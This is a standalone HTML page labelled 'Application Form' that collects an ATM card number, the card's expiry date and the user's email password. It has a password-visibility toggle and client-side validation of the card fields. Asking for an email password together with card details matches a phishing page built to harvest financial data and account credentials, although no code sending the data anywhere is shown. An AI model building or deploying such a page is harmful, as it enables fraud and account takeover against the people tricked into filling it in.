<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }
    .input-group {
      position: relative;
    }
    .input-group input {
      padding-right: 40px;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
      color: #888;
    }
    .error {
      color: red;
      font-size: 14px;
      display: none;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <form id="applicationForm">
    <label for="cardNumber">ATM Card Number (16 digits):</label>
    <input type="text" id="cardNumber" maxlength="19" placeholder="Enter 16-digit card number" required />
    <div id="cardError" class="error">Card number must be 16 digits.</div>

    <label for="expiry">Expiry Date (MM/YY):</label>
    <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required />
    <div id="expiryError" class="error">Enter valid expiry (MM/YY).</div>

    <label for="password">Email Password:</label>
    <div class="input-group">
      <input type="password" id="password" required />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <!-- Add other fields as needed -->

    <button type="submit" style="margin-top: 20px;">Submit</button>
  </form>

  <script>
    // Toggle password visibility
    function togglePassword() {
      const password = document.getElementById("password");
      password.type = password.type === "password" ? "text" : "password";
    }

    // Format card number live
    const cardInput = document.getElementById("cardNumber");
    cardInput.addEventListener("input", () => {
      let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
      let formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
      cardInput.value = formatted;
    });

    // Format expiry as MM/YY
    const expiryInput = document.getElementById("expiry");
    expiryInput.addEventListener("input", () => {
      let value = expiryInput.value.replace(/\D/g, "").substring(0, 4);
      if (value.length >= 3) {
        expiryInput.value = value.substring(0, 2) + '/' + value.substring(2);
      } else {
        expiryInput.value = value;
      }
    });

    // Validate on submit
    document.getElementById("applicationForm").addEventListener("submit", function(e) {
      const cardValue = cardInput.value.replace(/\s/g, "");
      const expiryValue = expiryInput.value;

      let valid = true;

      // Card number check
      if (cardValue.length !== 16) {
        document.getElementById("cardError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("cardError").style.display = "none";
      }

      // Expiry date validation
      const expiryParts = expiryValue.split("/");
      const month = parseInt(expiryParts[0], 10);
      const year = parseInt("20" + expiryParts[1], 10);
      const currentYear = new Date().getFullYear();
      const currentMonth = new Date().getMonth() + 1;

      if (
        expiryParts.length !== 2 ||
        isNaN(month) || isNaN(year) ||
        month < 1 || month > 12 ||
        year < currentYear ||
        (year === currentYear && month < currentMonth)
      ) {
        document.getElementById("expiryError").style.display = "block";
        valid = false;
      } else {
        document.getElementById("expiryError").style.display = "none";
      }

      if (!valid) {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
